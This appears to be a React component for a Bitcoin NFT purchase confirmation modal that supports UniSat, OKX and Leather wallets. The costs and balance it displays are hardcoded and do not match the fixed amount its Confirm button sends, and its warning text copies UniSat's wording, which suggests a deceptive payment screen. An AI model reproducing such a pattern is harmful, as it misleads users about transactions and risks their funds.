import { WalletDetails } from "../../App";
import NFT from "../../assets/images/nft.png";
import "./nft-modal.css";
import { sendLeatherCrypto, sendOKXCrypto, sendUnisatBTC } from "./nft-payment";

export interface NFTModalProps {
  open: boolean;
  wallet: WalletDetails;
  feeRate: number;
  closeModal: () => void;
}

interface CostInfoProps {
  title?: string;
  titleExtra?: JSX.Element;
  className?: string;
  amount: number | string;
  currency: string;
  cost?: number;
  amountDisabled?: boolean;
}

export function Pill({
  text,
  className,
}: {
  text: string;
  className?: string;
}) {
  return <div className={`pill ${className}`}>{text}</div>;
}

export function CostInfo({
  title,
  titleExtra,
  className,
  amount,
  currency,
  cost,
  amountDisabled,
}: CostInfoProps) {
  return (
    <div className={`cost-info ${className}`}>
      <div className="title">
        <h6 className="text">{title}</h6>
        {titleExtra}
      </div>
      <div className={`details ${amountDisabled ? "disable-amount" : ""}`}>
        <span className="amount">{amount}</span>
        <div className="latter">
          <span className="currency">{currency}</span>
          {cost ? <span className="cost">≈${cost?.toFixed(2)}</span> : ""}
        </div>
      </div>
    </div>
  );
}

export default function NFTModal({ open, closeModal, wallet, feeRate=2 }: NFTModalProps) {
  function handleConfirm() {
    const amount = 10;

    if (wallet.id === "unisat") {
      sendUnisatBTC(wallet.address, amount, feeRate);
    } else if (wallet.id === "okx") {
      sendOKXCrypto(wallet.address, amount, feeRate)
    } else if (wallet.id === "leather") {
      sendLeatherCrypto(wallet.address, amount, feeRate)
    }
  }

  return (
    <section className={`nft-modal ${open ? "" : ""}`}>
      <aside className={`wrapper bg ${open ? "opened" : "closed"}`}></aside>
      <aside
        className={`wrapper ${open ? "opened" : "closed"}`}
        style={
          {
            //   display: open ? "" : "none",
          }
        }
      >
        <div className={`dialog ${open ? "opened" : "closed"}`}>
          <section className="header">
            <p className="title">Please confirm the transaction below</p>
            <div className="nft">
              <img src={NFT} />
            </div>
          </section>
          <section className="body">
            <div className="warning">
              <i className="el-icon-warning"></i>
              <p className="text">
                This collection was submitted by the community and its validity
                hasn't been confirmed by UniSat. Please verify(MagicEden,
                OrdinalsWallet) before making a purchase to avoid any losses.
              </p>
            </div>

            <div className="transaction-details">
              <div className="cost-group">
                <CostInfo
                  title="Total Value:"
                  amount={36000}
                  currency="sats"
                  cost={23.76}
                />
              </div>
              <div className="cost-group">
                <CostInfo
                  title="Service Fee"
                  titleExtra={<Pill text="0.5%" />}
                  amount={100}
                  currency="sats"
                  cost={0.12}
                  amountDisabled={true}
                />
                <CostInfo
                  title="Service Fee Final"
                  titleExtra={
                    <div className="final-fee-extra-title">
                      <Pill text="0.0%" className="brighter" />
                      <i className="iconfont icon-help-circle"></i>
                    </div>
                  }
                  amount={0}
                  currency="sats"
                  cost={0}
                />
              </div>

              <div className="cost-group">
                <CostInfo
                  title="Transaction Fee Rate:"
                  className="transact-fee-rate"
                  amount={115}
                  currency="sats/vB"
                  cost={0.12}
                />
                <CostInfo
                  title="532"
                  titleExtra={
                    <div className="calc-extra">
                      <span className="currency">vB</span>
                      <span className="text-white">*</span>
                      <div className="flex gap-1.5">
                        <span className="amount gradient-clip-1">115</span>
                        <span className="currency">sats/Vb</span>
                      </div>
                    </div>
                  }
                  amount={61180}
                  currency="sats"
                  cost={40.38}
                />
              </div>

              <div className="cost-group last">
                <CostInfo
                  title="Total:"
                  className="total"
                  amount={"≈97,180"}
                  currency="sats"
                  cost={64.14}
                />
                <CostInfo amount={0.0009718} currency="BTC" />
                <CostInfo
                  title="Available Balance:"
                  className="available-bal"
                  titleExtra={<i className="iconfont icon-help-circle"></i>}
                  amount={0.00200449}
                  currency="BTC"
                />
              </div>
            </div>
          </section>
          <section className="footer">
            <div className="footer-buttons">
              <button className="close" onClick={closeModal}>
                Cancel
              </button>
              <button
                className="confirm"
                onClick={handleConfirm}
              >
                Confirm
              </button>
            </div>
          </section>
        </div>
      </aside>
    </section>
  );
}
